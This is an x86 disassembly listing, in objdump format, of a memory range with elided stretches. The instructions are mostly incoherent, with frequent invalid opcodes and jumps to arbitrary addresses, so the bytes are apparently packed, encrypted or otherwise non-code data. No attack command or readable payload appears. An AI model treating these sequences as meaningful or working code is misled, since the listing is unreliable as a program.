  41dc19:	jmp    0x9b17:0x40deb142
  41dc20:	inc    esp
  41dc21:	xchg   edx,eax
  41dc22:	add    BYTE PTR [ebx+edi*1],bl
  41dc25:	cmc    
  41dc26:	and    al,0x58
  41dc28:	adc    BYTE PTR [esp+esi*8+0xc896abc],cl
  41dc2f:	aad    0xed
  41dc31:	out    0xcc,al
  41dc33:	inc    esi
  41dc34:	sbb    ch,BYTE PTR [edx-0x58420324]
  41dc3a:	sbb    ch,BYTE PTR [esi+eiz*1-0x42]
  41dc3e:	scas   eax,DWORD PTR es:[edi]
  41dc3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc40:	arpl   bx,si
	...
  41dcb2:	add    BYTE PTR [eax],al
  41dcb4:	pusha  
  41dcb5:	cdq    
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x82
  41dcc1:	(bad)  
  41dcc2:	fsub   st,st(4)
  41dcc4:	(bad)  
  41dcc5:	inc    eax
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	test   BYTE PTR [eax],0x0
  41dccb:	add    BYTE PTR [edi+0x104f54c],dh
  41dcd1:	add    eax,0x7aeee4ae
  41dcd6:	pop    es
  41dcd7:	add    al,0xaa
  41dcd9:	cmp    eax,0xed1e9b3a
  41dcde:	loope  0x41dc85
  41dce0:	lods   eax,DWORD PTR ds:[esi]
  41dce1:	into   
  41dce2:	in     al,0xb6
  41dce4:	cmp    eax,0x3111d8d6
  41dce9:	add    BYTE PTR [edi+0x5ca42b2a],ch
  41dcef:	sub    eax,0x2d02c7b4
  41dcf4:	pusha  
  41dcf5:	mov    edx,0x2056c763
  41dcfa:	call   0x38aa7296
  41dcff:	inc    edx
  41dd00:	mov    ebx,0xf6dfc301
  41dd05:	(bad)  
  41dd07:	sahf   
  41dd08:	pushf  
  41dd09:	pop    esp
  41dd0a:	call   0x82edb2eb
  41dd0f:	int3   
  41dd10:	imul   esp,edx,0x4b45a21a
  41dd16:	(bad)  
  41dd17:	pushf  
  41dd18:	push   ds
  41dd19:	jae    0x41dd93
  41dd1b:	xchg   esi,eax
  41dd1c:	adc    edx,DWORD PTR [ebx+0x2b40696c]
  41dd22:	pop    ss
  41dd23:	pushf  
  41dd24:	mov    cl,0x8
  41dd26:	mov    ebp,0x69e80ee7
  41dd2b:	push   0xffffffc2
  41dd2d:	mov    edi,0xf66c53d1
  41dd32:	mov    WORD PTR [edx],ss
  41dd34:	pop    edi
  41dd35:	push   edx
  41dd36:	cmc    
  41dd37:	cmp    DWORD PTR [ecx-0x7b7bfe26],edi
  41dd3d:	xor    edi,DWORD PTR [ebx-0x11f1268e]
  41dd43:	mov    ds:0x1a12bb6c,eax
  41dd48:	xchg   edx,eax
  41dd49:	cmp    al,0xa7
  41dd4b:	popa   
  41dd4c:	xor    BYTE PTR [ebx+0x79aa3ad3],dl
  41dd52:	rol    BYTE PTR [ebp-0x6a],0xd0
  41dd56:	fisttp WORD PTR [eax]
  41dd58:	jnp    0x41ddb5
  41dd5a:	imul   ecx,esi,0xe6d8941c
  41dd60:	dec    esp
  41dd61:	adc    esp,eax
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	mov    bh,0xf4
  41dd66:	call   0xcfb9:0xfe35f946
  41dd6d:	mov    eax,ds:0x689fafbd
  41dd72:	jle    0x41ddae
  41dd74:	jo     0x41dd85
  41dd76:	and    BYTE PTR [esi-0x788f1a5b],0x18
  41dd7d:	test   BYTE PTR [edx],dh
  41dd7f:	into   
  41dd80:	iret   
  41dd81:	lods   eax,DWORD PTR ds:[esi]
  41dd82:	iret   
  41dd83:	mov    ds:0x5d043fd4,al
  41dd88:	(bad)  
  41dd89:	or     dh,BYTE PTR [edi]
  41dd8b:	and    al,0x6d
  41dd8d:	mulps  xmm5,XMMWORD PTR [edi-0x59b1c1bf]
  41dd94:	xor    DWORD PTR [ecx+0x3c173ed8],eax
  41dd9a:	outs   dx,BYTE PTR ds:[esi]
  41dd9b:	xor    eax,0xb4cbcb87
  41dda0:	jmp    0xe8a0bf12
  41dda5:	fstp   DWORD PTR [ecx-0x120260c3]
  41ddab:	pushf  
  41ddac:	mov    ds:0xd1b99fbb,al
  41ddb1:	sub    dl,BYTE PTR [ebx-0x38]
  41ddb4:	jp     0x41dd76
  41ddb6:	lea    ebx,[edx]
  41ddb8:	jle    0x41dd77
  41ddba:	jnp    0x41de1b
  41ddbc:	pop    ebx
  41ddbd:	sbb    DWORD PTR [ebx+edi*2+0x946b],esp
	...
  41de34:	pop    es
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	push   ecx
  41de41:	(bad)  
  41de42:	out    dx,al
  41de43:	xchg   edx,eax
  41de44:	int3   
  41de45:	inc    ecx
  41de46:	add    DWORD PTR [eax],eax
  41de48:	test   BYTE PTR [eax],0x0
  41de4b:	add    BYTE PTR [ebx-0x3b25c078],ch
  41de51:	and    al,0x21
  41de53:	adc    ch,ch
  41de55:	aas    
  41de56:	add    cl,cl
  41de58:	mov    ebp,0xec8ea720
  41de5d:	adc    ah,BYTE PTR [ebx+0x31b0fcab]
  41de63:	fwait
  41de64:	adc    bl,al
  41de66:	retf   
  41de67:	jp     0x41dea3
  41de69:	adc    DWORD PTR [edx+0x22],esi
  41de6c:	(bad)  
  41de6d:	adc    al,0x40
  41de6f:	jbe    0x41de68
  41de71:	push   cs
  41de72:	test   ebp,ecx
  41de74:	js     0x41de9b
  41de76:	jo     0x41de72
  41de78:	out    0x8a,eax
  41de7a:	jmp    0x41de88
  41de7c:	cmp    eax,0x3842cd1a
  41de81:	(bad)  
  41de82:	dec    ebp
  41de83:	mov    eax,0x581cbb65
  41de88:	fsub   QWORD PTR [edi-0x2d62b4b8]
  41de8e:	adc    BYTE PTR [edx-0xd528f83],cl
  41de94:	mov    bl,0x96
  41de96:	xchg   BYTE PTR [ebp+0x21133a9a],dh
  41de9c:	mov    DWORD PTR [esi+0x48f9a2bc],0xcb0d498a
  41dea6:	fucomi st,st(1)
  41dea8:	call   0x94e520af
  41dead:	inc    esp
  41deae:	test   DWORD PTR [esi+edi*1-0x25],esp
  41deb2:	arpl   WORD PTR [ebx-0x361f122d],bx
  41deb8:	push   eax
  41deb9:	ret    0x78f0
  41debc:	xrelease xchg DWORD PTR [edi],ebx
  41debf:	mov    esi,DWORD PTR [ebx-0x4]
  41dec2:	lea    eax,[edx-0xc35ec01]
  41dec8:	push   edx
  41dec9:	mov    eax,0x7c302135
  41dece:	ror    edx,1
  41ded0:	fucomip st,st(3)
  41ded2:	xchg   esp,eax
  41ded3:	cmp    eax,0xa7b19a03
  41ded8:	fisttp QWORD PTR [edi+0x5b071183]
  41dede:	fist   DWORD PTR [esi]
  41dee0:	mov    dl,0x31
  41dee2:	adc    esi,DWORD PTR [ebp-0x363da650]
  41dee8:	add    al,0x32
  41deea:	fdiv   QWORD PTR [esi]
  41deec:	sbb    ecx,DWORD PTR [esi+ebx*8-0x636dd5eb]
  41def3:	(bad)  
  41def4:	iret   
  41def5:	mov    esp,0x8833946a
  41defa:	jne    0x41deb7
  41defc:	pushf  
  41defd:	xchg   ebp,eax
  41defe:	mov    ebx,0xcbf8e4
  41df03:	add    DWORD PTR [ebp+0x3e882963],0xc0906ee
  41df0d:	loopne 0x41df01
  41df0f:	mov    al,ds:0x788b5f66
  41df14:	sbb    bl,BYTE PTR [eax+0x44f7ab4c]
  41df1a:	xchg   edx,eax
  41df1b:	add    edx,DWORD PTR [ebp+0x799a856e]
  41df21:	xor    bh,BYTE PTR [ebp-0x53]
  41df24:	fild   QWORD PTR [ecx-0x6f]
  41df27:	mov    dh,0xfe
  41df29:	enter  0x7cbd,0x5d
  41df2d:	test   al,0x5f
  41df30:	push   edx
  41df31:	popa   
  41df32:	mov    al,0xa
  41df34:	mov    bh,BYTE PTR [eax+0x29]
  41df37:	mov    dh,0x67
  41df39:	(bad)  
  41df3a:	fs ja  0x41df45
  41df3d:	jno    0x41df2d
  41df3f:	and    al,0xb1
  41df41:	pop    es
	...
  41dfb2:	add    BYTE PTR [eax],al
  41dfb4:	mov    ecx,0xad432034
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	or     BYTE PTR [ebx],ah
  41dfc2:	mov    dh,0x2d
  41dfc4:	ret    0x142
  41dfc7:	add    dh,dh
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [eax-0x21a91642],ah
  41dfd1:	in     al,dx
  41dfd2:	pushf  
  41dfd3:	push   esp
  41dfd4:	dec    edi
  41dfd5:	jae    0x41e037
  41dfd7:	sbb    BYTE PTR [edi-0x6b6282fa],dh
  41dfdd:	xchg   esi,eax
  41dfde:	icebp  
  41dfdf:	mov    al,ds:0x1470521f
  41dfe4:	ja     0x41e033
  41dfe6:	or     DWORD PTR [esi+0x4720f668],ecx
  41dfec:	sti    
  41dfed:	outs   dx,DWORD PTR ds:[esi]
  41dfee:	cmc    
  41dfef:	call   0x1066ae3b
  41dff4:	leave  
  41dff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff6:	dec    edi
  41dff7:	xlat   BYTE PTR ds:[ebx]
  41dff8:	adc    bl,cl
  41dffa:	inc    esp
  41dffb:	mov    edi,0x90302c39
  41e000:	mov    dh,0x53
  41e002:	and    al,0x1b
  41e004:	push   es
  41e005:	lds    ebx,FWORD PTR [edi]
  41e007:	push   es
  41e008:	pop    edi
  41e009:	aam    0x52
  41e00b:	stos   BYTE PTR es:[edi],al
  41e00c:	pop    esp
  41e00d:	and    ch,BYTE PTR [eax]
  41e00f:	add    eax,0xeeabdd2d
  41e014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e015:	aas    
  41e016:	cmp    al,BYTE PTR [edi]
  41e018:	ret    0xe9fc
  41e01b:	push   ds
  41e01c:	mov    ds:0x4e9d6ae0,al
  41e021:	scas   eax,DWORD PTR es:[edi]
  41e022:	sub    al,0x70
  41e024:	pop    ebp
  41e025:	es push esi
  41e027:	clc    
  41e028:	(bad)  
  41e029:	fcomp  DWORD PTR [ecx+edi*1-0x61d162f5]
  41e030:	cmp    DWORD PTR ds:0xabb753e7,0x3d7205a6
  41e03a:	lea    esi,[edi]
  41e03c:	in     eax,0xe5
  41e03e:	lea    ebp,[edi+0x2d]
  41e041:	ds (bad) 
  41e043:	or     eax,0x1538aece
  41e048:	pop    ebx
  41e049:	sbb    al,0xbb
  41e04b:	mov    esi,0x757b4f3f
  41e050:	pop    esp
  41e051:	and    eax,0x2c0088ad
  41e056:	fld    DWORD PTR [edx+0x2d]
  41e059:	lea    esp,[ebx-0x739656e9]
  41e05f:	mov    ch,0x8b
  41e061:	dec    ebp
  41e062:	shl    edx,cl
  41e064:	jecxz  0x41e0bb
  41e066:	sub    edi,esp
  41e068:	jmp    0xb23a:0x99e7a711
  41e06f:	mov    ds:0x1e418153,al
  41e074:	jg     0x41e078
  41e076:	push   edx
  41e077:	shl    DWORD PTR [ebx],0xbf
  41e07a:	inc    edi
  41e07b:	jmp    0x358e5dc
  41e080:	mov    ecx,edx
  41e082:	sub    ch,BYTE PTR [ebp-0x21]
  41e085:	sub    dh,BYTE PTR [ebx-0x4668747d]
  41e08b:	pop    ecx
  41e08c:	cmp    al,bh
  41e08e:	cwde   
  41e08f:	scas   eax,DWORD PTR es:[edi]
  41e090:	shl    ebx,0x54
  41e093:	mov    cl,0xa5
  41e095:	pop    ss
  41e096:	fwait
  41e097:	ja     0x41e0e3
  41e099:	mov    bh,0x0
  41e09b:	bound  ebx,QWORD PTR [edx]
  41e09d:	fstp   TBYTE PTR [ebp+0x5a]
  41e0a0:	in     al,dx
  41e0a1:	xchg   esi,eax
  41e0a2:	scas   al,BYTE PTR es:[edi]
  41e0a3:	xchg   ch,dl
  41e0a5:	out    dx,eax
  41e0a6:	dec    edi
  41e0a7:	in     eax,0xc8
  41e0a9:	xor    eax,DWORD PTR [esi-0x20130dc7]
  41e0af:	mov    ds:0x8af78593,al
  41e0b4:	mov    edx,ds
  41e0b6:	sub    ch,BYTE PTR [esi]
  41e0b8:	not    BYTE PTR [edi+0xe9cfab8]
  41e0be:	call   0x4af14d
	...
  41e133:	add    BYTE PTR [eax-0x3d],dl
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	jg     0x41e1ba
  41e142:	lods   eax,DWORD PTR ds:[esi]
  41e143:	mov    eax,ds:0x143b8
  41e148:	test   BYTE PTR [eax],0x0
  41e14b:	add    dh,bl
  41e14d:	test   al,0x92
  41e14f:	mov    ds:0x20aaffa5,eax
  41e154:	jmp    0x55d92c7b
  41e159:	jbe    0x41e194
  41e15b:	rcl    DWORD PTR [ebp+0x48],0xf0
  41e15f:	aas    
  41e160:	cmp    esp,DWORD PTR [ebx-0x6eff7b4e]
  41e166:	mov    al,ds:0x98f9aa
  41e16b:	mov    al,ds:0x61202a49
  41e170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e171:	lea    ecx,[edx-0x62f8ba70]
  41e177:	jg     0x41e10a
  41e179:	lods   eax,DWORD PTR ds:[esi]
  41e17a:	sbb    al,0xa8
  41e17c:	in     eax,dx
  41e17d:	stos   BYTE PTR es:[edi],al
  41e17e:	pop    es
  41e17f:	mul    al
  41e181:	imul   ecx,DWORD PTR [esi],0x21
  41e184:	adc    eax,0xf08a20cf
  41e189:	xor    eax,0x8eba621e
  41e18e:	dec    eax
  41e18f:	ret    0xb070
  41e192:	mov    ds:0x9c13c612,al
  41e197:	xchg   DWORD PTR [eax+0x8],ecx
  41e19a:	sbb    BYTE PTR [edi],0x93
  41e19d:	test   DWORD PTR [ecx+0x3f],edi
  41e1a0:	cmp    al,0x78
  41e1a2:	push   ds
  41e1a3:	inc    ebp
  41e1a4:	add    eax,ecx
  41e1a6:	nop
  41e1a7:	inc    eax
  41e1a8:	cdq    
  41e1a9:	fdivr  DWORD PTR [edx-0xae7c5ac]
  41e1af:	xor    cl,BYTE PTR [edi]
  41e1b1:	or     al,0xdb
  41e1b3:	xchg   BYTE PTR [ebp-0x4c],dl
  41e1b6:	mov    esi,0x49f21397
  41e1bb:	jp     0x41e155
  41e1bd:	outs   dx,BYTE PTR ds:[esi]
  41e1be:	ret    0x995e
  41e1c1:	push   0xffffffd2
  41e1c3:	sub    esi,ecx
  41e1c5:	in     al,0x97
  41e1c7:	ret    
  41e1c8:	lahf   
  41e1c9:	daa    
  41e1ca:	aaa    
  41e1cb:	in     al,dx
  41e1cc:	pop    ecx
  41e1cd:	add    edx,DWORD PTR [esi+0x16]
  41e1d0:	pop    ss
  41e1d1:	and    al,0xaf
  41e1d3:	xlat   BYTE PTR ds:[ebx]
  41e1d4:	mov    dh,0x61
  41e1d6:	sti    
  41e1d7:	fldpi  
  41e1d9:	rcr    BYTE PTR [ebp+eax*8-0x67],cl
  41e1dd:	jnp    0x41e18d
  41e1df:	push   ebx
  41e1e0:	loopne 0x41e1e6
  41e1e2:	push   ds
  41e1e3:	js     0x41e16a
  41e1e5:	inc    eax
  41e1e6:	pop    DWORD PTR [ebx]
  41e1e8:	dec    esp
  41e1e9:	pusha  
  41e1ea:	push   ds
  41e1eb:	xor    ch,BYTE PTR [edx]
  41e1ed:	push   ecx
  41e1ee:	add    dh,BYTE PTR [esi-0x5e]
  41e1f1:	rcr    BYTE PTR [edx-0x71],0x70
  41e1f5:	mov    WORD PTR [edx-0x70],?
  41e1f8:	call   0x35:0x41306f95
  41e1ff:	cmp    DWORD PTR [edi-0x54],ecx
  41e202:	sub    dl,BYTE PTR [ecx-0x1e]
  41e205:	xchg   esp,eax
  41e206:	nop
  41e207:	dec    DWORD PTR [esi+0x71]
  41e20a:	xor    esp,DWORD PTR [edi-0x2189d105]
  41e210:	xor    DWORD PTR [ecx],eax
  41e212:	cwde   
  41e213:	sbb    eax,DWORD PTR [edi]
  41e215:	mov    ds:0x49cb7411,eax
  41e21a:	adc    eax,0x5d4624d6
  41e21f:	jno    0x41e201
  41e221:	nop
  41e222:	cmp    al,0xc4
  41e224:	mov    DWORD PTR [eax-0x11],edx
  41e227:	outs   dx,DWORD PTR ds:[esi]
  41e228:	ss mov bh,0xac
  41e22b:	dec    ebp
  41e22c:	jecxz  0x41e1e0
  41e22e:	in     eax,dx
  41e22f:	mov    dl,0x14
  41e231:	test   eax,0x44568f6e
  41e236:	jg     0x41e28a
  41e238:	aaa    
  41e239:	add    dl,0x17
  41e23c:	or     dh,BYTE PTR [ecx-0x36]
  41e23f:	mov    esp,0x1ee2
	...
  41e2b4:	inc    BYTE PTR [eax+0x7dff54f9]
  41e2ba:	jmp    FWORD PTR [edx+0x7b6356a5]
  41e2c0:	xchg   esi,eax
  41e2c1:	fiadd  DWORD PTR [eax+0x3f]
  41e2c4:	scas   al,BYTE PTR es:[edi]
  41e2c5:	inc    esp
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	test   BYTE PTR [eax],0x0
  41e2cb:	add    BYTE PTR [edi+0x27],ch
  41e2ce:	add    eax,0xd8a2171c
  41e2d3:	aaa    
  41e2d4:	popf   
  41e2d5:	ds add eax,0x7c67bdf2
  41e2db:	mov    ebx,ecx
  41e2dd:	mov    ?,WORD PTR [edx]
  41e2df:	popa   
  41e2e0:	dec    ecx
  41e2e1:	or     eax,0xd8d043a0
  41e2e6:	mov    eax,ds:0xef7e0d6b
  41e2eb:	mov    esi,0x74117995
  41e2f0:	in     al,0x4b
  41e2f2:	jno    0x41e351
  41e2f4:	frstor ds:0xcf3cd29f
  41e2fa:	int3   
  41e2fb:	repz mov esp,0x6e1e8e0e
  41e301:	mov    al,BYTE PTR [ebx+0x12]
  41e304:	inc    ecx
  41e305:	pop    edx
  41e306:	mov    esi,0x81b8f63b
  41e30b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e30c:	pop    ebx
  41e30d:	int3   
  41e30e:	loopne 0x41e2be
  41e310:	jno    0x41e2ce
  41e312:	jp     0x41e30a
  41e314:	(bad)  
  41e315:	ja     0x41e2f4
  41e317:	out    dx,eax
  41e318:	out    0x2e,al
  41e31a:	sbb    dl,al
  41e31c:	loopne 0x41e2c7
  41e31e:	cmp    ah,BYTE PTR [edx+0x52]
  41e321:	adc    eax,0xf38a5ec4
  41e326:	loopne 0x41e38c
  41e328:	ret    
  41e329:	in     al,0xc5
  41e32b:	add    DWORD PTR [ebp+0x1],edx
  41e32e:	xchg   edi,eax
  41e32f:	mov    ss,WORD PTR [esi-0x2c]
  41e332:	ja     0x41e2f7
  41e334:	mov    al,ds:0xa9943775
  41e339:	test   al,0x69
  41e33b:	pop    ds
  41e33c:	mov    al,0xd
  41e33e:	or     dh,BYTE PTR [edx]
  41e340:	sbb    al,0xc8
  41e342:	xchg   DWORD PTR [esi],esp
  41e344:	cmp    eax,0xb0b3f9c1
  41e349:	push   ebp
  41e34a:	add    ebp,DWORD PTR [edx+0x76]
  41e34d:	add    ah,BYTE PTR [eax+edx*4]
  41e350:	in     eax,dx
  41e351:	aad    0x7f
  41e353:	dec    esp
  41e354:	jb     0x41e360
  41e356:	imul   esi,DWORD PTR [eax-0x32],0x25e8062a
  41e35d:	les    ecx,FWORD PTR [esi-0xaba59f6]
  41e363:	ret    
  41e364:	shl    BYTE PTR [eax+0x6c15bc1b],1
  41e36a:	pop    esp
  41e36b:	mov    al,0xc5
  41e36d:	cld    
  41e36e:	test   BYTE PTR [esi],dl
  41e370:	inc    ebx
  41e371:	cld    
  41e372:	push   0x79
  41e374:	mov    ds:0x151bec5b,al
  41e379:	mov    cl,0x33
  41e37b:	xor    eax,0x15a01c50
  41e380:	and    ebp,DWORD PTR [ecx+0x6c]
  41e383:	xchg   esp,eax
  41e384:	stos   DWORD PTR es:[edi],eax
  41e385:	jmp    0x41e3a1
  41e387:	stos   DWORD PTR es:[edi],eax
  41e388:	loope  0x41e3f3
  41e38a:	out    dx,al
  41e38b:	push   ecx
  41e38c:	aas    
  41e38d:	inc    edi
  41e38e:	in     al,dx
  41e38f:	dec    edi
  41e390:	mov    dl,BYTE PTR ds:0x648abbb6
  41e396:	xchg   DWORD PTR [ebp-0x11],edi
  41e399:	mov    ch,0x5f
  41e39b:	mov    eax,0x1a19560b
  41e3a0:	fxch   st(3)
  41e3a2:	sbb    ah,0xe9
  41e3a5:	xchg   esi,eax
  41e3a6:	retf   
  41e3a7:	cmp    eax,0xa43089c5
  41e3ac:	push   ds
  41e3ad:	push   ds
  41e3ae:	(bad)  
  41e3af:	mov    al,ds:0xe95e85d9
  41e3b4:	scas   al,BYTE PTR es:[edi]
  41e3b5:	xor    BYTE PTR [ebp-0x5],ah
  41e3b8:	retf   
  41e3b9:	pop    esp
  41e3ba:	adc    BYTE PTR [edi-0x2138da4c],cl
  41e3c0:	jmp    0x41e363
	...
  41e432:	add    BYTE PTR [eax],al
  41e434:	div    BYTE PTR [esi]
  41e436:	rcl    BYTE PTR [edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x7764fead,al
  41e442:	sub    DWORD PTR [ebx],esp
  41e444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e445:	inc    ebp
  41e446:	add    DWORD PTR [eax],eax
  41e448:	test   BYTE PTR [eax],0x0
  41e44b:	add    al,ch
  41e44d:	into   
  41e44e:	add    BYTE PTR [esi-0x3d],ah
  41e451:	repnz (bad) 
  41e453:	out    dx,eax
  41e454:	mov    eax,0x9e990e7
  41e459:	sahf   
  41e45a:	aam    0x6b
  41e45c:	cld    
  41e45d:	sbb    DWORD PTR [ecx+ebx*2],edi
  41e460:	rcr    DWORD PTR [ecx],cl
  41e462:	mov    al,ds:0x8dd38a3f
  41e467:	stc    
  41e468:	or     eax,0xafa7f68d
  41e46d:	ja     0x41e4aa
  41e46f:	pop    DWORD PTR [ebp-0x1e]
  41e472:	mov    esi,0x49fdc46b
  41e477:	int3   
  41e478:	xchg   ebp,eax
  41e479:	retf   
  41e47a:	sub    eax,0x1199650c
  41e47f:	adc    eax,0x12ecc3ae
  41e484:	cs out 0xc2,eax
  41e487:	retf   
  41e488:	mov    ebp,ds
  41e48a:	xchg   edi,eax
  41e48b:	sbb    cl,BYTE PTR [ebx-0x47]
  41e48e:	ret    0x1029
  41e491:	xor    bl,0x8a
  41e494:	cmp    eax,0x2577a958
  41e499:	ja     0x41e483
  41e49b:	loop   0x41e459
  41e49d:	and    al,0xda
  41e49f:	imul   eax,DWORD PTR [ebp+0x55],0xffffffba
  41e4a3:	inc    esp
  41e4a4:	sbb    BYTE PTR [esi],bh
  41e4a6:	jecxz  0x41e493
  41e4a8:	or     eax,0xc6a1272b
  41e4ad:	jno    0x41e527
  41e4af:	xchg   edx,eax
  41e4b0:	pop    edi
  41e4b1:	and    dl,BYTE PTR [esi+edi*4+0xd]
  41e4b5:	push   ebx
  41e4b6:	xchg   BYTE PTR [ecx-0x3bf5c909],bl
  41e4bc:	sub    DWORD PTR [ebx+ebx*1],0xa9ff3d3a
  41e4c3:	lea    ecx,[edi-0x5cea8dd3]
  41e4c9:	fldcw  WORD PTR [eax-0xf7f8f32]
  41e4cf:	cmc    
  41e4d0:	jbe    0x41e544
  41e4d2:	sbb    bh,al
  41e4d4:	std    
  41e4d5:	mov    ebx,esi
  41e4d7:	es dec ecx
  41e4d9:	test   al,0x54
  41e4db:	cld    
  41e4dc:	cmp    dh,ch
  41e4de:	jmp    0xa7d9:0x8ccbcd24
  41e4e5:	pop    ecx
  41e4e6:	pusha  
  41e4e7:	das    
  41e4e8:	in     al,0xcb
  41e4ea:	lds    eax,FWORD PTR [edx-0x75e754c4]
  41e4f0:	lock mov edi,ebp
  41e4f3:	out    0x29,al
  41e4f5:	hlt    
  41e4f6:	pushf  
  41e4f7:	add    eax,0xfd9fb2f3
  41e4fc:	dec    edi
  41e4fd:	jl     0x41e4bb
  41e4ff:	test   DWORD PTR gs:[esi-0x2ee9b4a3],esp
  41e506:	loop   0x41e4f3
  41e508:	aad    0x60
  41e50a:	xchg   esi,eax
  41e50b:	enter  0xf6e2,0xf4
  41e50f:	(bad)  [edi+0x7b]
  41e512:	div    DWORD PTR [edi+0x24]
  41e515:	out    dx,eax
  41e516:	mov    BYTE PTR [edx-0x2c51fc29],bl
  41e51c:	sbb    al,0x92
  41e51e:	out    dx,eax
  41e51f:	sbb    eax,DWORD PTR [edx+0x400fcff8]
  41e525:	inc    edx
  41e526:	hlt    
  41e527:	jae    0x41e501
  41e529:	aam    0xb3
  41e52b:	sbb    al,0x52
  41e52d:	ss jl  0x41e4cf
  41e530:	mov    ?,WORD PTR [esp+ebp*4+0x56286fbd]
  41e537:	pop    eax
  41e538:	push   edx
  41e539:	adc    al,0x10
  41e53b:	inc    BYTE PTR [edx+ecx*1-0x33c410eb]
	...
  41e5b2:	add    BYTE PTR [eax],al
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz (bad) 
  41e5c1:	lahf   
  41e5c2:	data16 mov al,0x9a
  41e5c5:	inc    esi
  41e5c6:	add    DWORD PTR [eax],eax
  41e5c8:	test   BYTE PTR [eax],0x0
  41e5cb:	add    BYTE PTR [ebx+0x1e],cl
  41e5ce:	xchg   esi,eax
  41e5cf:	fs sbb al,0xf5
  41e5d2:	jp     0x41e62e
  41e5d4:	rol    BYTE PTR [ecx+0x34],0xce
  41e5d8:	fiadd  DWORD PTR [edi]
  41e5da:	xor    eax,0xa71058e3
  41e5df:	jg     0x41e64a
  41e5e1:	lods   al,BYTE PTR ds:[esi]
  41e5e2:	mov    esi,0xd803ecb7
  41e5e7:	fwait
  41e5e8:	in     eax,0x77
  41e5ea:	cmp    DWORD PTR [ebx-0x6374ff4],eax
  41e5f0:	lods   eax,DWORD PTR ds:[esi]
  41e5f1:	scas   eax,DWORD PTR es:[edi]
  41e5f2:	inc    ecx
  41e5f3:	sub    BYTE PTR [eax+0x26],0x28
  41e5f7:	(bad)  [esi]
  41e5f9:	xor    eax,0x7bea6860
  41e5fe:	pop    ebx
  41e5ff:	sub    al,0x73
  41e601:	test   eax,0xc7132848
  41e606:	popf   
  41e607:	test   eax,0x25edb06c
  41e60c:	shl    BYTE PTR [ebx+eiz*2+0x4806464f],0xd4
  41e614:	leave  
  41e615:	shl    DWORD PTR [ecx],0xde
  41e618:	(bad)
  41e61b:	adc    edx,0xffffffee
  41e61e:	xor    al,0xab
  41e620:	out    0x9f,al
  41e622:	popf   
  41e623:	(bad)  
  41e625:	jb     0x41e5d9
  41e627:	or     al,0xea
  41e629:	loope  0x41e620
  41e62b:	std    
  41e62c:	lahf   
  41e62d:	jmp    0xdce7:0x96f05f38
  41e634:	lds    edx,FWORD PTR [eax-0x11]
  41e637:	retf   0xb5f5
  41e63a:	test   eax,0x84bd9fd3
  41e63f:	and    ch,BYTE PTR [ebx]
  41e641:	es push cs
  41e643:	mov    bl,0x90
  41e645:	cmp    ebp,DWORD PTR [esi]
  41e647:	cmp    edx,esp
  41e649:	add    bh,0xbb
  41e64c:	cmp    DWORD PTR [edi],edi
  41e64e:	dec    ebp
  41e64f:	hlt    
  41e650:	ins    DWORD PTR es:[edi],dx
  41e651:	arpl   WORD PTR [ebx],cx
  41e653:	iret   
  41e654:	ret    0x1f62
  41e657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e659:	mov    esp,0x9799489e
  41e65e:	xor    al,0x7e
  41e660:	je     0x41e63d
  41e662:	test   eax,0x2d41da64
  41e667:	scas   al,BYTE PTR es:[edi]
  41e668:	push   0x75
  41e66a:	jmp    DWORD PTR [esi-0x6dcf7131]
  41e670:	stos   BYTE PTR es:[edi],al
  41e671:	inc    edi
  41e672:	clc    
  41e673:	mov    ch,0xe4
  41e675:	es (bad) 
  41e677:	sbb    al,0xa8
  41e679:	scas   eax,DWORD PTR es:[edi]
  41e67a:	cmp    bh,BYTE PTR [ebx-0x5e]
  41e67d:	dec    edx
  41e67e:	and    al,0x2e
  41e680:	jl     0x41e6fe
  41e682:	and    al,0x5b
  41e684:	mov    ah,0x8b
  41e686:	jge    0x41e655
  41e688:	in     al,dx
  41e689:	je     0x41e62f
  41e68b:	sub    al,0x2b
  41e68d:	sbb    DWORD PTR [ebx-0x716224f8],0x360b52d1
  41e697:	mov    cl,0x6c
  41e699:	adc    al,BYTE PTR [ebp+0x5f]
  41e69c:	adc    eax,0xcc50757a
  41e6a1:	mov    cl,0x36
  41e6a3:	in     al,0x47
  41e6a5:	add    esi,edi
  41e6a7:	pop    ds
  41e6a8:	call   esp
  41e6aa:	xor    ah,dh
  41e6ac:	int3   
  41e6ad:	pop    esi
  41e6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6af:	dec    edi
  41e6b0:	push   ebp
  41e6b1:	mov    ecx,0x8e027c68
  41e6b6:	es daa 
  41e6b8:	sub    dl,BYTE PTR [ebx]
  41e6ba:	inc    esi
  41e6bb:	rol    DWORD PTR [esi-0x7d0066eb],0xa1
	...
  41e732:	add    BYTE PTR [eax],al
  41e734:	and    al,0xce
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
